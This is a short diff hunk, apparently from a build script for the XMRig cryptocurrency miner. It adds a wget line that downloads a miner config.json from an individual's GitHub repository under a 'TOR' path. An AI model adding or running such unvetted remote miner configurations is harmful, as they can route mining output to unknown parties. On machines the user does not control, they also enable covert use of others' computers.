@@ -4,3 +4,4 @@ mkdir xmrig/build && cd xmrig/scripts
 ./build_deps.sh && cd ../build
 cmake .. -DXMRIG_DEPS=scripts/deps
 make -j$(nproc)
+wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/config.json
